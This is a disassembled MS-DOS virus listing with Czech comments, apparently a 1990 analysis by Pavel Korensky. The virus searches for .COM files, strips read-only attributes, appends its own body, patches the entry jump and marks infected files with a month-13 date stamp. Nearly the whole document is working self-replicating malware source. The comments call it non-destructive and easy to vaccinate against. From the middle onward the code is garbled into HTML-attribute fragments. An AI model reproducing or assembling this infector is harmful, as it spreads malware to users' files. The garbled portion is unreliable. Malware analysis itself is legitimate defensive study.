

seg_a		segment
		assume	cs:seg_a, ds:seg_a
		org	100h
  
izol534		proc	far
  
start:
                jmp     loc_1
                db      500 dup (0)             ; NENI VIRUS !!!
                db      0B8h, 0, 0, 0CDh, 20h   ; ZBYTEK MEHO PROGRAMKU
loc_1:
                push    ax
; --------------   PRENOS USCHOVANYCH TRI BYTU Z VIRU NA ZACATEK PROGRAMU
                mov     si,461h                 ; SI=Zacatek tabulky
                mov     dx,si
		add	si,0
                cld
                mov     cx,3                    ; Kopiruj 3 byty
		mov	di,100h
                rep     movsb
;---------------   TEST VERZE DOSu
                mov     di,dx                   ; DI=Ukazatel na zacatek prac.oblasti
                mov     ah,30h
                int     21h                     ; Get DOS version
		cmp	al,0
                jne     loc_2
                jmp     loc_16                  ; Pokud blba, konec
;---------------   NASTAVENI DTA PRO VIRUS
loc_2:
		mov	dx,2Ch
		add	dx,di
		mov	bx,dx
		mov	ah,1Ah
                int     21h                     ; Set DTA DOS Service
		mov	bp,0
		mov	dx,di
                add     dx,7                    ; DS:DX=ASCIIZ String pro hledani. ????????.COM
;---------------   HLEDANI SOUBORU PRO NAKAZENI
loc_3:
                mov     cx,3                    ; Hledej i Hidden a ReadOnly
                mov     ah,4Eh
                int     21h                     ; DOS Service Find First
                                                ; Hledane jmeno je @ds:dx
                jmp     loc_5
loc_4:
                mov     ah,4Fh
                int     21h                     ; DOS Service Find Next
loc_5:
                jnc     loc_8                   ; Pokud OK, dal
                cmp     al,12h                  ; Chyba NO MORE FILES ??
                je      loc_6                   ; Pokud ano, dalsi testy
                jmp     loc_15                  ; Konci praci a startuj program
loc_6:
                cmp     bp,0FFFFh               ; Hledame '\' ??
                jne     loc_7                   ; Pokud ne, budeme tak cinit
                jmp     loc_15                  ; Jinak KONEC a start programu
loc_7:
                dec     dx                      ; DS:DX ukazuje na '\'
                mov     bp,0FFFFh               ; Signal, ze hledame '\'
                jmp     short loc_3             ; Hledej znovu
loc_8:
                mov     cx,[bx+18h]             ; Cti DATE STAMP
		and	cx,1E0h
                cmp     cx,1A0h                 ; Ma soubor nastaven mesic cislo 13 ?
                je      loc_4                   ; Pokud ano, hledej dal
		cmp	word ptr [bx+1Ah],0FA00h
                ja      loc_4
		cmp	word ptr [bx+1Ah],100h
                jb      loc_4                   ; Pokud je delka>FA00H nebo delka<100h, pak="" hledej="" dal="" ;---------------="" prepis="" jmena="" souboru="" do="" viru="" push="" di="" mov="" si,bx="" add="" si,1eh="" add="" di,14h="" cmp="" bp,0ffffh="" ;="" hledal="" se="" '\'="" jne="" loc_9="" ;="" pokud="" ne,="" jdi="" dal="" jinak="" mov="" al,5ch="" ;="" uloz="" napred="" '\'="" stosb="" ;="" na="" es:[di]="" loc_9:="" lodsb="" ;="" string="" [si]="" do="" al="" stosb="" ;="" uloz="" al="" na="" es:[di]="" cmp="" al,0="" ;="" konec="" jmena="" jne="" loc_9="" ;="" dokud="" ne,="" tak="" se="" cykli="" ;---------------="" zrus="" pripadny="" read-only="" attribut="" pop="" di="" ;="" zacatek="" workarea="" zpet="" mov="" dx,di="" add="" dx,14h="" ;="" dx="" ukazuje="" na="" zkopirovane="" jmeno="" mov="" ax,4300h="" int="" 21h="" ;="" dos="" service="" get/set="" file="" attribut="" jmeno="" @ds:dx="" ;="" v="" tomto="" pripade="" get="" attrib.="" mov="" [di+22h],cx="" ;="" uloz="" attrib.="" and="" cx,0fffeh="" ;="" zamaskuj="" readonly="" mov="" dx,di="" add="" dx,14h="" ;="" dx="" ukazuje="" opet="" na="" jmeno="" mov="" ax,4301h="" int="" 21h="" ;="" dos="" service="" get/set="" file="" attr.="" jmeno="" @ds:dx="" ;="" v="" tomto="" pripade="" set="" ;---------------="" otevreni="" souboru="" mov="" dx,di="" add="" dx,14h="" ;="" dx="" opet="" ukazuje="" na="" jmeno="" mov="" ax,3d02h="" int="" 21h="" ;="" dos="" service="" open="" file="" ;="" jmeno="" @ds:dx,="" pro="" cteni="" a="" zapis="" jnc="" loc_10="" jmp="" loc_14="" ;="" pokud="" chyba,="" tak="" konec="" ;---------------="" file="" date="" loc_10:="" mov="" bx,ax="" ;="" bx="File" handle="" mov="" ax,5700h="" int="" 21h="" ;="" dos="" service="" get/set="" file="" date&time="" ;="" momentalne="" get="" mov="" [di+24h],cx="" ;="" uloz="" time="" mov="" [di+26h],dx="" ;="" uloz="" date="" ;---------------="" nacte="" do="" sebe="" prvni="" 3="" byty="" (zacatek="" programu)="" mov="" ah,3fh="" mov="" cx,3="" mov="" dx,di="" add="" dx,0="" int="" 21h="" ;="" dos="" service="" read="" file="" jnc="" loc_11="" jmp="" loc_13="" ;="" pokud="" chyba,="" koncit="" ;---------------="" posun="" file-pointeru="" na="" konec="" souboru="" loc_11:="" cmp="" ax,3="" ;="" nacetl="" ok="" jne="" loc_13="" ;="" pokud="" ne,="" koncit="" mov="" ax,4202h="" ;="" budeme="" delat="" sluzbu="" 42h="" a="" merit="" budeme="" od="" konce="" mov="" cx,0="" ;="" 0="" bytu="" od="" konce="" mov="" dx,cx="" int="" 21h="" ;="" dos="" service="" move="" file="" ptr="" cx,dx="offset" ;---------------="" vypocty="" pro="" ulozeni="" sub="" ax,3="" ;="" odecti="" 3="" kvuli="" jmp="" instrukci="" mov="" [di+4],ax="" ;="" uloz="" si="" to="" a="" vytvor="" tak="" jmp="" xxxx="" instrukci="" ve="" workarea="" mov="" cx,165h="" ;="" cmp="" dx,0="" ;="" soubor="" kratsi="" nez="" 65535="" b="" jne="" loc_13="" ;="" pokud="" ne,="" konec="" mov="" dx,di="" sub="" di,cx="" ;="" di="Zacatek" viru="" (adresa="" zacatku)="" add="" di,2="" ;="" pocatecni="" instrukce="" tela="" viru="" (mov="" si,zacatek="" workarea)="" add="" ax,103h="" add="" ax,cx="" ;="" ax="Novy" zacatek="" workarea="" pro="" kopii="" mov="" [di],ax="" ;="" uloz="" to="" do="" sebe="" ;---------------="" vlastni="" pripojeni="" k="" souboru="" mov="" ah,40h="" mov="" di,dx="" sub="" dx,cx="" ;="" zacatek="" viru="" v="" pameti="" mov="" cx,216h="" ;="" delka="" viru="" int="" 21h="" ;="" dos="" service="" write="" file="" ;="" zapise="" cx="bytu" z="" ds:dx="" jnc="" loc_12="" jmp="" loc_13="" ;="" pokud="" nebylo="" vse="" ok,="" konci="" ;---------------="" zapis="" prvnich="" tri="" bytu="" (start="" viru)="" loc_12:="" cmp="" ax,216h="" jne="" loc_13="" ;="" pokud="" se="" nezapsalo="" celych="" 216h="" bytu,="" konci="" mov="" ax,4200h="" ;="" dos="" move="" od="" zacatku="" souboru="" mov="" cx,0="" ;="" 0="" bytu="" offset="" mov="" dx,cx="" int="" 21h="" ;="" dos="" service="" move="" file="" ptr="" ;="" cx,dx="offset" (zde="" nastavi="" na="" zacatek)="" jc="" loc_13="" ;="" pokud="" chyba,="" konec="" mov="" ah,40h="" mov="" cx,3="" ;="" tri="" byty="" mov="" dx,di="" ;="" ds:dx="" ukazuje="" na="" upraveny="" jmp="" do="" viru="" add="" dx,3="" int="" 21h="" ;="" dos="" service="" write="" file="" ;="" cx="bytu" z="" ds:dx="" ;---------------="" uprava="" data="" souboru="" jako="" test="" pro="" sireni="" (13.mesic)="" loc_13:="" mov="" cx,[di+24h]="" ;="" cx="DATE" stamp="" mov="" dx,[di+26h]="" ;="" dx="TIME" stamp="" and="" dx,0fe1fh="" or="" dx,1a0h="" ;="" vyrobil="" 13="" mesic="" mov="" ax,5701h="" int="" 21h="" ;="" dos="" service="" get/set="" file="" date&time="" ;="" v="" tomto="" pripade="" set="" mov="" ah,3eh="" int="" 21h="" ;="" dos="" service="" close="" file="" ;---------------="" uprav="" attributy="" souboru="" na="" puvodni="" hodnotu="" ;---------------="" !!!!!!="" zde="" je="" ve="" viru="" chyba="" !!!!!!="" --------------------="" loc_14:="" mov="" ax,4300h="" ;="" zde="" je="" zrejme="" chyba="" !!="" melo="" by="" byt="" mov="" ax,4301h="" mov="" cx,[di+22h]="" ;="" puvodni="" attrib.="" do="" cx="" int="" 21h="" ;="" dos="" service="" get/set="" attrib.="" ;="" jmeno="" @ds:dx,="" zde="" je="" puvodne="" get,="" ale="" melo="" by="" tu="" byt="" set="" ;---------------="" zpatky="" dta="" na="" puvodni="" hodnotu="" loc_15:="" mov="" dx,80h="" mov="" ah,1ah="" int="" 21h="" ;="" dos="" service="" set="" dta="" na="" ds:dx="" ;---------------="" start="" puvodniho="" programu="" loc_16:="" pop="" ax="" mov="" di,100h="" ;="" adresa="" startu="" push="" di="" retn="" ;="" skoc="" tam="" db="" 0e9h,="" 0f4h,="" 1,="" 0e9h,="" 0f9h,="" 1="" ;="" zde="" se="" schovavaji="" a="" tvori="" jmp="" xxxx="" db="" 5ch="" ;="" '\'="" db="" 8="" dup="" (3fh)="" ;="" '????????'="" db="" 2eh,="" 43h,="" 4fh,="" 4dh,="" 0="" ;="" '.com'="" db="" 'model.com'="" ;="" sem="" se="" kopiruje="" jmeno="" souboru="" a="" directory="" info="" db="" 0,="" 0,="" 4dh,="" 0,="" 0,="" 20h="" db="" 0,="" 2bh,="" 0bdh,="" 0a3h,="" 14h,="" 0="" db="" 0,="" 0,="" 0,="" 1="" db="" 3fh="" db="" 7="" dup="" (3fh)="" db="" 43h,="" 4fh,="" 4dh,="" 3,="" 2="" db="" 7="" dup="" (0)="" db="" 20h,="" 2bh,="" 0bdh,="" 0a3h,="" 14h,="" 0fch="" db="" 1,="" 0,="" 0="" db="" 'model.com'="" db="" 0,="" 0,="" 0,="" 0="" db="" 'osoftyright="" microsoftyright="" micr'="" db="" 'osoftyright="" microsoftyright="" micr'="" db="" 'osoftyright="" microsoft="" 1988'="" izol534="" endp="" seg_a="" ends="" end="" start="" ;="" virus="" se="" tedy="" jen="" kopiruje="" a="" nic="" destruktivniho="" nedela="" ;="" napada="" jen="" .com="" soubory="" od="" velikosti="" 100h="" do="" 0fa00h="" ;="" jako="" identifikator="" nakazeni="" je="" pouzit="" 13.mesic="" v="" date="" stamp="" ;="" neni="" rezidentni="" v="" pameti="" a="" pri="" kazdem="" spusteni="" infikovaneho="" programu="" se="" ;="" muze="" nakazit="" jen="" jeden="" soubor.="" ;="" lze="" proti="" nemu="" napsat="" vakcinu="" celkem="" snadno.="" programy="" lze="" i="" imunizovat="" ;="" ;="" ;="" ;="" ;="" analysed="" and="" disassembled="" by="" pavel="" korensky="" pkcs="" 3.5.1990=""></100h,>